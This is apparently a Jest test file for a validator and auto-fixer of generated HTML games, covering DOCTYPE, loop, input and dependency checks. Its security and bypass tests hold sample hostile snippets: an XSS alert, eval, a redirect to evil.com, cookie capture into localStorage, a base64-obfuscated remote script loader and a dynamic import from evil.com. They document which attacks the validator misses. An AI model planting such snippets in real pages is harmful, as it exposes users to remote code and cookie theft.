const {
  MINIMAL_CANVAS_TEMPLATE,
  MINIMAL_DOM_TEMPLATE,
  MINIMAL_TEXT_TEMPLATE,
  validateGameHtml,
  autoFixHtml,
  stripCommentsAndStrings,
  hasCanvasElement
} = require('../services/gameTemplates');

// Helper to create minimal valid HTML for testing specific issues
const validBase = (scriptContent) => `<!DOCTYPE html><html><head>
  <meta name="viewport" content="width=device-width">
  <style>*{}</style>
</head><body>
<script>
  document.addEventListener('click', () => {});
  setInterval(() => {}, 100);
  ${scriptContent}
</script>
</body></html>`;

describe('gameTemplates adversarial tests', () => {
  describe('validateGameHtml edge cases', () => {
    // Test 1: DOCTYPE in wrong location (not at start)
    // Limitation: The validator checks if DOCTYPE exists, not if it's at the start
    it('should detect DOCTYPE not at the start of document - KNOWN LIMITATION', () => {
      const html = '<!-- comment --><!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      // This passes even though DOCTYPE should be first - documenting limitation
      expect(issues.some(i => i.name === 'hasDoctype')).toBe(false);
    });

    // Test 2: External script with relative protocol - NOW FIXED
    it('should detect external scripts with protocol-relative URLs', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><script src="//example.com/lib.js"></script></head><body><style>*{}</style><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      // FIXED: Now correctly detects protocol-relative URLs
      expect(issues.some(i => i.name === 'noExternalDeps')).toBe(true);
    });

    // Test 3: HTML tag with attributes
    it('should detect html tag with attributes', () => {
      const html = '<!DOCTYPE html><html lang="en"><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'hasHtmlTag')).toBe(false);
    });

    // Test 4: Missing closing tags but </html> and </body> present
    it('should pass when closing tags exist even if other tags unclosed', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><div><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      // The div is unclosed but closedTags only checks </html> and </body>
      expect(issues.some(i => i.name === 'closedTags')).toBe(false);
    });

    // Test 5: while(true) with break in different scope - KNOWN LIMITATION
    // The check finds any 'break' in the script, not specifically in the while loop
    it('should detect while(true) even with break in different scope - KNOWN LIMITATION', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <script>
          document.addEventListener("click",()=>{});
          while(true) { console.log('infinite'); }
          function other() { break; }
        </script>
      </body></html>`;
      const issues = validateGameHtml(html);
      // Limitation: break in a different function makes this pass incorrectly
      expect(issues.some(i => i.name === 'potentialInfiniteLoop')).toBe(false);
    });

    // Test 6: while (true) with space - NOW FIXED
    it('should detect while (true) with space before parenthesis', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <script>document.addEventListener("click",()=>{});while (true) { console.log('infinite'); }</script>
      </body></html>`;
      const issues = validateGameHtml(html);
      // FIXED: Now correctly detects while with space
      expect(issues.some(i => i.name === 'potentialInfiniteLoop')).toBe(true);
    });

    // Test 7: undefined in string literal
    it('should not flag undefined in string literal', () => {
      const html = validBase('const msg = "variable is undefined";');
      const issues = validateGameHtml(html);
      // This correctly passes because the regex requires '= undefined'
      expect(issues.some(i => i.name === 'undefinedAssignment')).toBe(false);
    });

    // Test 8: External dependency with single quotes
    it('should detect external scripts with single quotes', () => {
      const html = "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width\"><script src='https://example.com/lib.js'></script></head><body><style>*{}</style><script>document.addEventListener('click',()=>{});setInterval(()=>{},100)</script></body></html>";
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'noExternalDeps')).toBe(true);
    });

    // Test 9: CDN in data attribute or strings - NOW FIXED (no false positive)
    it('should not flag cdn in data attributes or strings', () => {
      const html = validBase('const url = "cdn.test.com";');
      const issues = validateGameHtml(html);
      // FIXED: Now only checks for CDN in href/src attributes
      expect(issues.some(i => i.name === 'noCDN')).toBe(false);
    });

    // Test 10: Text game with different input ID - NOW FIXED
    it('should recognize text games with non-standard input IDs', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <input type="text" id="user-input" />
        <script>
          document.addEventListener('keypress', () => {});
        </script>
      </body></html>`;
      const issues = validateGameHtml(html);
      // FIXED: Now uses broader detection for text/input games
      expect(issues.some(i => i.name === 'hasGameLoop')).toBe(false);
    });

    // Test 11: Game with only onclick (no addEventListener)
    it('should pass game with only onclick handlers', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <button onclick="handleClick()">Click</button>
        <script>
          function handleClick() {}
          setInterval(() => {}, 100);
        </script>
      </body></html>`;
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'hasInput')).toBe(false);
    });

    // Test 12: Empty script tag - passes but game won't work
    it('should pass with empty script tag - GAME WONT WORK', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script></script></body></html>';
      const issues = validateGameHtml(html);
      // Has script tag but it's empty - game won't work
      // Missing hasGameLoop and hasInput
      expect(issues.some(i => i.name === 'hasScript')).toBe(false);
      expect(issues.some(i => i.name === 'hasGameLoop')).toBe(true);
      expect(issues.some(i => i.name === 'hasInput')).toBe(true);
    });

    // Test 13: Script tag with only comments
    it('should detect script tag containing only comments has no input', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <script>
          // This is just a comment
          /* Multi-line
             comment */
        </script>
      </body></html>`;
      const issues = validateGameHtml(html);
      // Has script tag but no actual code - should fail hasGameLoop and hasInput
      expect(issues.some(i => i.name === 'hasScript')).toBe(false);
      expect(issues.some(i => i.name === 'hasGameLoop')).toBe(true);
    });

    // Test 14: Malformed HTML that might cause parser issues
    it('should handle severely malformed HTML', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style><body><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script>';
      const issues = validateGameHtml(html);
      // Missing closing tags
      expect(issues.some(i => i.name === 'closedTags')).toBe(true);
    });

    // Test 15: Case sensitivity - DOCTYPE variants - NOW FIXED
    it('should handle lowercase doctype', () => {
      const html = '<!doctype html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      // FIXED: Now handles lowercase doctype
      expect(issues.some(i => i.name === 'hasDoctype')).toBe(false);
    });
  });

  describe('autoFixHtml edge cases', () => {
    // Test 16: HTML without head tag
    it('should handle HTML without head tag - no viewport added', () => {
      const html = '<!DOCTYPE html><html><body></body></html>';
      const fixed = autoFixHtml(html);
      // autoFixHtml only adds to <head> if it exists
      expect(fixed).not.toContain('viewport');
    });

    // Test 17: Multiple style tags
    it('should only add box-sizing once with multiple style tags', () => {
      const html = '<!DOCTYPE html><html><head><style>a{}</style><style>b{}</style></head><body><canvas></canvas></body></html>';
      const fixed = autoFixHtml(html);
      const matches = fixed.match(/box-sizing/g);
      expect(matches.length).toBe(1);
    });

    // Test 18: Style tag with existing box-sizing
    it('should not duplicate box-sizing if already present', () => {
      const html = '<!DOCTYPE html><html><head><style>* { box-sizing: border-box; }</style></head><body><canvas></canvas></body></html>';
      const fixed = autoFixHtml(html);
      const matches = fixed.match(/box-sizing/g);
      expect(matches.length).toBe(1);
    });

    // Test 19: Viewport already present
    it('should not duplicate viewport if already present', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"></head><body></body></html>';
      const fixed = autoFixHtml(html);
      const matches = fixed.match(/viewport/g);
      expect(matches.length).toBe(1);
    });

    // Test 20: DOCTYPE with different casing - NOW FIXED
    it('should not add duplicate DOCTYPE for different casing', () => {
      const html = '<!doctype html><html><head></head><body></body></html>';
      const fixed = autoFixHtml(html);
      // FIXED: Now case-insensitive check prevents duplicate
      const doctypeMatches = fixed.match(/<!DOCTYPE/gi);
      expect(doctypeMatches.length).toBe(1);
    });

    // Test 21: Script with document.write (dangerous)
    it('should not modify potentially dangerous script content', () => {
      const html = '<!DOCTYPE html><html><head><style></style></head><body><canvas></canvas><script>document.write("test")</script></body></html>';
      const fixed = autoFixHtml(html);
      expect(fixed).toContain('document.write("test")');
    });

    // Test 22: Style tag at end of body
    it('should add fixes when style is in body', () => {
      const html = '<!DOCTYPE html><html><head></head><body><style></style><canvas></canvas></body></html>';
      const fixed = autoFixHtml(html);
      // autoFixHtml looks for '<style>' but not specifically in head
      expect(fixed).toContain('box-sizing');
    });

    // Test 23: Empty string input
    it('should handle empty string', () => {
      const fixed = autoFixHtml('');
      expect(fixed).toContain('<!DOCTYPE html>');
    });

    // Test 24: Canvas mentioned in text but not as element - NOW FIXED
    it('should not add overflow hidden when canvas is only mentioned in text', () => {
      const html = '<!DOCTYPE html><html><head><style></style></head><body><p>Draw on the canvas</p></body></html>';
      const fixed = autoFixHtml(html);
      // FIXED: Now only adds overflow hidden for actual canvas elements
      expect(fixed).not.toContain('overflow: hidden');
    });
  });

  describe('security checks - NOT IMPLEMENTED', () => {
    // These tests document that security checks are NOT currently implemented
    // They all pass validation but could be dangerous

    // Test 25: XSS in game content
    it('should validate games with XSS patterns - NO SECURITY CHECK', () => {
      const html = validBase('// <script>alert("XSS")</script>');
      const issues = validateGameHtml(html);
      // No XSS check implemented
      expect(issues.length).toBe(0);
    });

    // Test 26: Eval in game code
    it('should not flag eval - NO SECURITY CHECK', () => {
      const html = validBase('eval("console.log(\\"dangerous\\")")');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 27: Window.location modification
    it('should not flag location modification - NO SECURITY CHECK', () => {
      const html = validBase('window.location = "https://evil.com"');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 28: LocalStorage access
    it('should not flag localStorage access - NO SECURITY CHECK', () => {
      const html = validBase('localStorage.setItem("key", document.cookie)');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });
  });

  describe('runtime error detection - NOT IMPLEMENTED', () => {
    // These tests document that the validator cannot detect runtime errors
    // They all pass validation but will fail when executed

    // Test 29: Undefined variable reference
    it('passes validation but references undefined variable - RUNTIME ERROR', () => {
      const html = validBase('console.log(undefinedVar.x);');
      const issues = validateGameHtml(html);
      // Validator doesn't parse JS semantics
      expect(issues.length).toBe(0);
    });

    // Test 30: Null canvas context
    it('passes validation but uses wrong context type - RUNTIME ERROR', () => {
      const html = validBase('const ctx = document.createElement("canvas").getContext("3d");');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 31: Division by zero
    it('passes validation but has division by zero - RUNTIME ERROR', () => {
      const html = validBase('const speed = 100 / 0;');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 32: Array access out of bounds
    it('passes validation but accesses array out of bounds - RUNTIME ERROR', () => {
      const html = validBase('const items = []; console.log(items[0].x);');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });
  });

  describe('validation heuristic improvements', () => {
    // Test 33: Game loop in comments - stripCommentsAndStrings should help
    it('now strips comments before checking for infinite loops', () => {
      const code = `
        // while(true) { }
        /* setInterval(() => {}, 100); */
        actualCode();
      `;
      const stripped = stripCommentsAndStrings(code);
      expect(stripped).not.toContain('while(true)');
      expect(stripped).not.toContain('setInterval');
      expect(stripped).toContain('actualCode');
    });

    // Test 34: Strings are stripped
    it('strips string literals', () => {
      const code = `const tutorial = "Use document.addEventListener to handle input";`;
      const stripped = stripCommentsAndStrings(code);
      expect(stripped).not.toContain('addEventListener');
    });

    // Test 35: Encoded external URL bypass - NOT DETECTED
    it('should not detect base64 encoded external URL - NO CHECK', () => {
      const html = validBase(`
        const url = atob('aHR0cHM6Ly9ldmlsLmNvbS9tYWx3YXJlLmpz');
        const s = document.createElement('script');
        s.src = url;
        document.head.appendChild(s);
      `);
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 36: Dynamic import bypass - NOT DETECTED
    it('should not detect dynamic import statements - NO CHECK', () => {
      const html = validBase("import('https://evil.com/module.js').then(m => m.run());");
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });
  });

  describe('helper function tests', () => {
    // Test hasCanvasElement
    it('hasCanvasElement detects actual canvas elements', () => {
      expect(hasCanvasElement('<canvas id="game"></canvas>')).toBe(true);
      expect(hasCanvasElement('<CANVAS></CANVAS>')).toBe(true);
      expect(hasCanvasElement('<canvas>')).toBe(true);
    });

    it('hasCanvasElement does not match canvas in text', () => {
      expect(hasCanvasElement('<p>Draw on the canvas</p>')).toBe(false);
      expect(hasCanvasElement('// canvas comment')).toBe(false);
    });

    // Test stripCommentsAndStrings
    it('stripCommentsAndStrings removes all comment types', () => {
      const code = `
        // single line
        /* multi
           line */
        code();
      `;
      const stripped = stripCommentsAndStrings(code);
      expect(stripped).not.toContain('single line');
      expect(stripped).not.toContain('multi');
      expect(stripped).toContain('code()');
    });

    it('stripCommentsAndStrings removes all string types', () => {
      const code = `
        const a = "double quoted";
        const b = 'single quoted';
        const c = \`template literal\`;
      `;
      const stripped = stripCommentsAndStrings(code);
      expect(stripped).not.toContain('double quoted');
      expect(stripped).not.toContain('single quoted');
      expect(stripped).not.toContain('template literal');
    });
  });

  describe('template integrity', () => {
    // Test 37: Canvas template is playable
    it('canvas template has complete game structure', () => {
      expect(MINIMAL_CANVAS_TEMPLATE).toContain('function update()');
      expect(MINIMAL_CANVAS_TEMPLATE).toContain('function draw()');
      expect(MINIMAL_CANVAS_TEMPLATE).toContain('function gameLoop()');
      expect(MINIMAL_CANVAS_TEMPLATE).toContain('player');
      expect(MINIMAL_CANVAS_TEMPLATE).toContain('score');
    });

    // Test 38: DOM template has timer
    it('DOM template has complete timer system', () => {
      expect(MINIMAL_DOM_TEMPLATE).toContain('timeLeft');
      expect(MINIMAL_DOM_TEMPLATE).toContain('endGame');
      expect(MINIMAL_DOM_TEMPLATE).toContain('startGame');
      expect(MINIMAL_DOM_TEMPLATE).toContain('clearInterval');
    });

    // Test 39: Text template has state management
    it('text template has state management', () => {
      expect(MINIMAL_TEXT_TEMPLATE).toContain('state');
      expect(MINIMAL_TEXT_TEMPLATE).toContain('location');
      expect(MINIMAL_TEXT_TEMPLATE).toContain('inventory');
      expect(MINIMAL_TEXT_TEMPLATE).toContain('processCommand');
    });
  });

  describe('boundary conditions', () => {
    // Test 40: Very long HTML
    it('should handle very long HTML', () => {
      const longScript = 'x'.repeat(100000);
      const html = validBase(`const data = "${longScript}";`);
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 41: HTML with null bytes
    it('should handle HTML with null bytes', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>\x00<script>document.addEventListener("click",()=>{});setInterval(()=>{},100)</script></body></html>';
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 42: HTML with Unicode
    it('should handle HTML with unicode characters', () => {
      const html = validBase('const msg = "\\u{1F600} \\u{1F389}";');
      const issues = validateGameHtml(html);
      expect(issues.length).toBe(0);
    });

    // Test 43: null input
    it('should handle null input gracefully', () => {
      expect(() => validateGameHtml(null)).toThrow();
    });

    // Test 44: undefined input
    it('should handle undefined input gracefully', () => {
      expect(() => validateGameHtml(undefined)).toThrow();
    });

    // Test 45: Object input
    it('should handle object input gracefully', () => {
      expect(() => validateGameHtml({ html: 'test' })).toThrow();
    });

    // Test 46: autoFixHtml with null
    it('autoFixHtml should handle null input', () => {
      // autoFixHtml does not throw on null, it returns string with "null"
      const result = autoFixHtml(null);
      expect(typeof result).toBe("string");
    });
  });

  describe('fixed bugs verification', () => {
    // These tests verify that previously identified bugs are now fixed

    it('FIXED: protocol-relative URLs are now detected', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><script src="//evil.com/lib.js"></script></head><body><style>*{}</style><script>document.addEventListener("x",()=>{});setInterval(()=>{},1)</script></body></html>';
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'noExternalDeps')).toBe(true);
    });

    it('FIXED: while loop with space is now detected', () => {
      const html = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script>document.addEventListener("x",()=>{});while (true) {}</script></body></html>';
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'potentialInfiniteLoop')).toBe(true);
    });

    it('FIXED: lowercase doctype is now recognized', () => {
      const html = '<!doctype html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body><script>document.addEventListener("x",()=>{});setInterval(()=>{},1)</script></body></html>';
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'hasDoctype')).toBe(false);
    });

    it('FIXED: autoFixHtml does not add duplicate DOCTYPE for lowercase', () => {
      const html = '<!doctype html><html><head></head><body></body></html>';
      const fixed = autoFixHtml(html);
      const count = (fixed.match(/<!doctype/gi) || []).length;
      expect(count).toBe(1);
    });

    it('FIXED: CDN check does not have false positives for JS strings', () => {
      const html = validBase('const url = "cdn.test.com";');
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'noCDN')).toBe(false);
    });

    it('FIXED: text game detection is broader', () => {
      const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><style>*{}</style></head><body>
        <input type="text" id="any-input-id" />
        <script>document.addEventListener('click', () => {});</script>
      </body></html>`;
      const issues = validateGameHtml(html);
      expect(issues.some(i => i.name === 'hasGameLoop')).toBe(false);
    });
  });
});
